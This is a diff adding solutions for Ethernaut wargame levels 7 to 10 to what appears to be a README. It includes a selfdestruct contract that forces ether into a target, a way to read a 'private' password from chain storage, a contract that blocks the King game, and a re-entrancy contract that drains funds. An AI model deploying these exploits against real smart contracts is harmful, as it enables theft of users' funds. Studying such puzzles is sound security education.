@@ -120,3 +120,106 @@ contract.sendTransaction({
 ```
 
 </details> 
+
+ <details>
+    <summary>Level 7 - Force</summary>
+
+Relevant chapter in [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract TakeMyMoney {
+    fallback() external payable {}
+    
+    function boom(address payable _address) public {
+        selfdestruct(_address);
+    }
+}
+```
+
+</details> 
+
+ <details>
+    <summary>🏦 Level 8 - Vault</summary>
+
+Find the transaction that was used to create the contract on Etherscan, and look in the state change tab. We can see the value that was stored in the first variable: that's the password, then we just invoke unlock with it:
+
+```javascript
+await contract.unlock("0x...")
+```
+
+</details> 
+
+ <details>
+    <summary>👑 Level 9 - King</summary>
+
+Trying to make this contract the king, it should refuse eth transfers, hence preventing the ownership transfer. Deploy it with 1 ETH, so that it has a starting balance.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+
+interface King {
+    function _king() external view returns (address payable);
+}
+
+contract KingMaker {
+    constructor() public payable {}
+    
+    function kingMe(address kingInstance) public {
+        // send ether using a low-level call because send/transfer are limited to 2300 gas
+      // send exactly 1 ether, because we need to pass the condition but not exceed the balance of the King contract
+        kingInstance.call{value:1 ether}("");
+        require(King(kingInstance)._king() == address(this));
+    }
+    
+    function withdraw() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+
+</details> 
+
+
+ <details>
+    <summary>🔁 Level 10 - Re-entrancy</summary>
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+interface Reentrance {
+  function donate(address _to) external payable;
+  function withdraw(uint _amount) external;
+}
+
+contract Withdrawer {
+    Reentrance instance = Reentrance(address(...));
+    uint amount = 0.1 ether;
+    
+    constructor() payable {}
+    
+    // this is where we trigger the re-entrancy bug
+    receive() external payable {
+        if (address(instance).balance >= amount)  {
+            instance.withdraw(amount);
+        }
+    }
+    
+    function pullTheTrigger() public {
+        instance.donate{value: amount}(address(this));
+        instance.withdraw(amount);
+    }
+    
+    function drain() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+```
+
+</details> 
